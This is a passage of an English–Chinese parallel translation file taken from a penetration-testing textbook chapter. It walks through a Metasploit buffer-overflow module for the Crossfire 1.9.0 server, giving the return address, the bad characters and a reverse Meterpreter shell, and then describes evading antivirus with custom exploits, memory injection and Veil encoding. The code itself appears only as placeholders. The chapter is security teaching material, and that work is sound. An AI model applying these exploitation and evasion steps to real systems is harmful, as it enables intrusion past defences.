  zh: 上述命令将在/root/.msf4/modules/exploits/custom/cf目录中创建一个名为`custom_cf`的文件。
- en: 'Now, let''s edit the `custom_cf.rb` file and place the following content in
    it:'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们编辑`custom_cf.rb`文件，并将以下内容放入其中：
- en: '![](img/672e6ba9-81f8-4603-a9ad-cdb9657f1aa8.png)'
  id: totrans-92
  prefs: []
  type: TYPE_IMG
  zh: '![](img/672e6ba9-81f8-4603-a9ad-cdb9657f1aa8.png)'
- en: '![](img/214be2c9-1973-4f30-bd38-57ddd2c2c4a1.png)'
  id: totrans-93
  prefs: []
  type: TYPE_IMG
  zh: '![](img/214be2c9-1973-4f30-bd38-57ddd2c2c4a1.png)'
- en: The preceding mentioned code snippet is very straightforward. It makes an attempt
    to exploit the buffer overflow vulnerability present in the Crossfire application.
    Metasploit has a defined template for its exploit modules, and if we have to write
    a module in Metasploit, we need to tweak the template according to our requirements.
    The preceding template is the one used for the buffer overflow class of vulnerabilities.
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 上述提到的代码片段非常简单。它试图利用Crossfire应用程序中存在的缓冲区溢出漏洞。Metasploit为其利用模块定义了一个模板，如果我们要在Metasploit中编写模块，我们需要根据我们的需求调整模板。上述模板是用于缓冲区溢出类漏洞的模板。
- en: 'We studied buffer overflows in great detail in the previous chapters. Based
    on what we have learned, we can say that to exploit a buffer overflow vulnerability,
    an attacker must know the following:'
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在之前的章节中详细研究了缓冲区溢出。根据我们所学到的，我们可以说要利用缓冲区溢出漏洞，攻击者必须了解以下内容：
- en: The size of payload that the buffer space can accommodate.
  id: totrans-96
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 缓冲区空间可以容纳的有效载荷大小。
- en: The return address of the stack, which must be overwritten by the address of
    the buffer where the exploit code is injected. The actual return address would
    vary, but the offset of the payload after which the return address would get overwritten
    can be computed. Once we have the offset, we can place the address of the memory
    location where we are able to inject the exploit.
  id: totrans-97
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 堆栈的返回地址，必须被注入漏洞利用代码的缓冲区地址所覆盖。实际的返回地址会有所不同，但可以计算出覆盖返回地址的有效负载偏移量。一旦我们有了偏移量，我们就可以放置我们能够注入漏洞利用程序的内存位置的地址。
- en: The set of characters recognized as bad characters by the application, which
    might hamper the execution of our exploit.
  id: totrans-98
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 应用程序识别的一组字符，可能会妨碍我们的漏洞利用程序的执行。
- en: The amount of padding needed.
  id: totrans-99
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 所需的填充量。
- en: The architecture and OS details.
  id: totrans-100
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 架构和操作系统的详细信息。
- en: For the attacker to obtain the items mentioned, they perform a series of steps,
    which includes fuzzing, offset computation, return address checks, bad character
    checks, and so on. If the preceding values are known, the next step for the attacker
    is usually to generate an encoded payload and send it to the service and get a
    reverse shell. If the preceding values are not known, Metasploit provides a buffer
    overflow template, where the values can just be plugged in and used, without requiring
    us to write custom code from scratch.
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者为了获得上述项目，会执行一系列步骤，包括模糊测试、偏移计算、返回地址检查、坏字符检查等。如果已知上述值，攻击者的下一步通常是生成编码的有效负载并将其发送到服务端并获得一个反向shell。如果上述值未知，Metasploit提供了一个缓冲区溢出模板，可以直接插入并使用这些值，而无需我们从头开始编写自定义代码。
- en: The application under discussion, Crossfire, has been fuzzed and debugged offline.
    According to the fuzzing results, the obtained return address or value of the
    EIP is `0X0807b918`. In other words, this implies that if we overflow the buffer,
    the exploit code will be placed at the location with the following address: `0X0807b918`.
    Furthermore, as can be seen above, the amount of padding specified is 300 (spaces).
    We have also specified the bad characters: `\x00\x0a\x0d\x20`. As well as this,
    we have specified that the platform is Linux.
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 讨论中的应用程序Crossfire已经在离线状态下进行了模糊测试和调试。根据模糊测试结果，获得的返回地址或EIP的值为`0X0807b918`。换句话说，这意味着如果我们溢出缓冲区，漏洞利用代码将被放置在以下地址的位置：`0X0807b918`。此外，如上所示，指定的填充量为300（空格）。我们还指定了坏字符：`\x00\x0a\x0d\x20`。除此之外，我们还指定了平台为Linux。
- en: 'Please Note : A bad character is a character which  is not recognized by the
    character-set of the program being tested , as of which it can make the program
    act in unexpected manner. in order to figure out the common bad characters for
    the underlying software being tested , the most successful method is trial and
    error.What i usually do to figure out the common bad characters , is to send all
    unique characters to the application , and then using the debugger ,we check what
    characters are changed at register level. The ones that get changed can be encoded
    and avoided.'
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意：坏字符是程序字符集无法识别的字符，因此它可能使程序以意外的方式运行。为了找出正在测试的底层软件的常见坏字符，最成功的方法是反复试验。我通常用来找出常见坏字符的方法是将所有唯一字符发送到应用程序，然后使用调试器，检查寄存器级别发生了哪些字符变化。发生变化的字符可以进行编码和避免。
- en: 'Therefore, in line 43, when we invoke the `payload.invoke` command, Metasploit internally creates
    a reverse Meterpreter TCP payload and encodes it, which returns a shell at port
    `4444`. Let''s try to see this in action:'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 因此，在第43行，当我们调用`payload.invoke`命令时，Metasploit内部创建一个反向Meterpreter TCP有效负载并对其进行编码，返回一个端口为`4444`的shell。让我们尝试看看这个过程：
- en: 'First, let''s install and start the crossfire application. The vulnerable version
    of the crossfire application can be found at the following URL [https://osdn.net/projects/sfnet_crossfire/downloads/crossfire-server/1.9.0/crossfire-1.9.0.tar.gz/](https://osdn.net/projects/sfnet_crossfire/downloads/crossfire-server/1.9.0/crossfire-1.9.0.tar.gz/).
    Download it and unzip it with the following command:'
  id: totrans-105
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 首先，让我们安装并启动Crossfire应用程序。可以在以下网址找到易受攻击版本的Crossfire应用程序[https://osdn.net/projects/sfnet_crossfire/downloads/crossfire-server/1.9.0/crossfire-1.9.0.tar.gz/](https://osdn.net/projects/sfnet_crossfire/downloads/crossfire-server/1.9.0/crossfire-1.9.0.tar.gz/)。下载并使用以下命令解压缩：
- en: '[PRE6]'
  id: totrans-106
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: 'Then, start the vulnerable server as follows:'
  id: totrans-107
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 然后，按以下方式启动易受攻击的服务器：
- en: '![](img/98107c65-0bc0-49dc-ab3e-c966c6264711.png)'
  id: totrans-108
  prefs: []
  type: TYPE_IMG
  zh: '![](img/98107c65-0bc0-49dc-ab3e-c966c6264711.png)'
- en: 'Now go ahead and start Metasploit. Export the module we created, and try to
    exploit the vulnerable server:'
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 现在继续启动Metasploit。导出我们创建的模块，并尝试利用易受攻击的服务器：
- en: '![](img/9f271686-e0b4-46fd-b09e-a2f0f2a3b0c2.png)'
  id: totrans-110
  prefs: []
  type: TYPE_IMG
  zh: '![](img/9f271686-e0b4-46fd-b09e-a2f0f2a3b0c2.png)'
- en: As we can see, the exploit we developed work flawlessly and gave us the reverse
    shell of the victim's machine, which, in our case, is the same machine as we are
    working on.
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 正如我们所看到的，我们开发的漏洞利用程序完美地运行，并为我们提供了受害者机器的反向shell，而在我们的情况下，这台机器与我们正在使用的机器相同。
- en: Encoding shell codes to avoid detection
  id: totrans-112
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 对shell代码进行编码以避免检测
- en: 'Let''s now say that we have identified a vulnerability in an underlying service
    that we are testing. However, in this case, the box has got antivirus software
    installed. Any good antivirus software will contain all the signatures of well-known
    exploits, and typically the signatures for almost all the Metasploit exploit modules
    would be present. It is therefore imperative for us to use a methodology that
    would evade the antivirus detection. This means we need to use some sort of encoding
    or any other method to deliver our payload to avoid AV detection. There are three
    different ways that we can do this:'
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 现在假设我们已经在我们正在测试的底层服务中发现了一个漏洞。然而，在这种情况下，该服务器已安装了杀毒软件。任何优秀的杀毒软件都将包含所有知名漏洞的签名，通常几乎所有Metasploit漏洞利用模块的签名都会存在。因此，我们必须使用一种可以规避杀毒软件检测的方法。这意味着我们需要使用某种编码或其他方法来传递我们的有效负载，以避免杀毒软件的检测。我们可以通过三种不同的方式来做到这一点：
- en: The most successful method is to develop a custom exploit in a language of your
    choice (Python/C/C++/Java). This method is useful, because a custom exploit will
    not have any AV signatures and would usually evade the AV protection. Alternatively,
    we can also download a public exploit and modify it heavily to change the signature
    that it produces. The exploits we developed in the web exploitation use cases
    were both written from scratch and so theoretically no AV should pick them up.
  id: totrans-114
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 最成功的方法是使用您选择的语言（Python/C/C++/Java）开发自定义利用程序。这种方法很有用，因为自定义利用程序不会有任何AV签名，通常会逃避AV保护。或者，我们也可以下载一个公共利用程序，并进行大量修改以改变其产生的签名。我们在Web利用案例中开发的利用程序都是从头开始编写的，理论上不应该被任何AV检测到。
- en: The second method is to inject our payload/exploit in the process memory of
    the underlying system. Doing that will execute the code in the memory, and this
    would not be detected with most antivirus software.
  id: totrans-115
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 第二种方法是将我们的有效载荷/利用程序注入到底层系统的进程内存中。这样做将在内存中执行代码，并且大多数防病毒软件都不会检测到。
- en: The third method is to make use of encoding to prevent detection. In this section,
    we are going to see how we can make use of a very powerful encoding framework
    called VEIL to make a payload that might evade AV detection.
  id: totrans-116
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 第三种方法是利用编码来防止被检测。在本节中，我们将看到如何利用一个非常强大的编码框架VEIL来制作一个可能逃避AV检测的有效载荷。
- en: Downloading and installing Veil
  id: totrans-117
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 下载和安装Veil
- en: 'It should be noted that Veil comes pre-installed with the latest version of
    Kali Linux. For other versions of Linux, we can install Veil with the following
    commands:'
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: 应该注意，Veil已预装在最新版本的Kali Linux中。对于其他版本的Linux，我们可以使用以下命令安装Veil：
- en: '[PRE7]'
  id: totrans-119
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: 'Once Veil is successfully installed, the generation of veil encoded payloads
    is a very simple task. What happens behind the scenes while using veil is that
    , it makes an attempt to make the exploit code cryptic and random , so that the
    AV''s which work on signature based detection could be fooled from the randomness
    and cryptic nature of the exploit. There are two methods of doing this. One method
    is to use the interactive shell that veil provides. This can be invoked by typing
    the command `veil` and then choosing a payload under the evasion module. The other,
    easier option, is to specify all the options at the command line as follows:'
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦Veil成功安装，生成Veil编码有效载荷就是一个非常简单的任务。在使用Veil时，背后发生的事情是，它试图使利用代码变得神秘和随机，以便基于签名的检测工作的AV可能会被利用的随机性和神秘性所愚弄。有两种方法可以做到这一点。一种方法是使用Veil提供的交互式shell。这可以通过输入命令`veil`，然后在规避模块下选择一个有效载荷来调用。另一个更简单的选择是在命令行中指定所有选项，如下所示：
- en: '[PRE8]'
  id: totrans-121
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: 'The previous command will use Veil''s payload number `41` to carry out the
    encoding of the Metasploit module `windows/meterpreter/reverse_tcp`. This will
    produce the following output:'
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 上面的命令将使用Veil的有效载荷编号`41`来对Metasploit模块`windows/meterpreter/reverse_tcp`进行编码。这将产生以下输出：
- en: '![](img/df1f54a8-9f90-49b6-93f3-619126499a09.png)'
  id: totrans-123
  prefs: []
  type: TYPE_IMG
  zh: '![](img/df1f54a8-9f90-49b6-93f3-619126499a09.png)'
- en: The preceding screenshot shows the exploit that would be encoded by Veil and
    that can be delivered to the victim to see whether it evades the antivirus software.
    If it doesn't, then we must use the interactive version of Veil to tweak the payload
    parameters for it to generate a signature that is more unique. You can find more
    information about Veil from the links shared in the *Further reading* section.
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 上面的截图显示了Veil将对其进行编码并可以传递给受害者以查看其是否逃避防病毒软件的利用程序。如果没有，那么我们必须使用Veil的交互版本来调整有效载荷参数，以生成更独特的签名。您可以在“进一步阅读”部分的链接中找到有关Veil的更多信息。
- en: Summary
  id: totrans-125
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we learned about developing custom exploits to exploit web
    and network services. We also discussed how we can evade our exploit from antivirus
    software. Furthermore, we explored various web vulnerabilities, such as LFI and
    RFI, and talked about how these can be elevated to get a reverse shell from the
    victim. It's important to understand that exploit development requires a good
    understanding of the underlying vulnerability, and we should always try to make
    generic exploits that are reusable. Feel free to modify the exploit codes we discussed
    to make them generic and try them out with other applications.
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们学习了开发自定义利用程序来利用Web和网络服务。我们还讨论了如何从防病毒软件中逃避我们的利用。此外，我们还探讨了各种Web漏洞，如LFI和RFI，并讨论了如何提升这些漏洞以从受害者那里获得反向shell。重要的是要理解，利用开发需要对潜在漏洞的深入理解，我们应该始终尝试制作可重用的通用利用程序。请随意修改我们讨论的利用代码，使其通用化，并尝试在其他应用程序中使用它们。
- en: In the next chapter, we will step out of the penetration-testing ecosystem and
    understand a little more about the **Security operations center** (**SOC**), or
    the monitoring ecosystem of cyber security. We will understand what cyber threat
    intelligence is and how it can be used to safeguard an organization against potential
    threats. We will also understand how cyber threat intelligence can be automated
    to supplement detection capabilities with the help of a SIEM tool.
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章中，我们将走出渗透测试生态系统，了解更多关于安全运营中心（SOC）或网络安全监控生态系统的信息。我们将了解什么是网络威胁情报以及如何利用它来保护组织免受潜在威胁。我们还将了解如何将网络威胁情报自动化，以辅助SIEM工具的检测能力。
- en: Questions
  id: totrans-128
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 问题
- en: What other web-based vulnerabilities can be exploited with custom exploits?
  id: totrans-129
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 还可以使用自定义利用程序利用哪些其他基于Web的漏洞？
- en: How can we improve the exploit code developed to try various other possibilities
    if one attack vector fails?
  id: totrans-130
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果一个攻击向量失败，我们如何改进开发的利用代码以尝试其他可能性？
- en: Further reading
  id: totrans-131
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 进一步阅读
- en: 'Exploit development in Python: [https://samsclass.info/127/127_WWC_2014.shtml](https://samsclass.info/127/127_WWC_2014.shtml)'
  id: totrans-132
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Python中的利用程序开发：[https://samsclass.info/127/127_WWC_2014.shtml](https://samsclass.info/127/127_WWC_2014.shtml)
- en: Python exploit development assistance: [https://github.com/longld/peda](https://github.com/longld/peda)
  id: totrans-133
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Python漏洞开发辅助：[https://github.com/longld/peda](https://github.com/longld/peda)
- en: 'Creating Metasploit modules: [https://github.com/rapid7/metasploit-framework/wiki/Loading-External-Modules](https://github.com/rapid7/metasploit-framework/wiki/Loading-External-Modules)'
  id: totrans-134
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 创建Metasploit模块：[https://github.com/rapid7/metasploit-framework/wiki/Loading-External-Modules](https://github.com/rapid7/metasploit-framework/wiki/Loading-External-Modules)
- en: 'Veil: [https://www.veil-framework.com/veil-tutorial/](https://www.veil-framework.com/veil-tutorial/)'
  id: totrans-135
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Veil：[https://www.veil-framework.com/veil-tutorial/](https://www.veil-framework.com/veil-tutorial/)
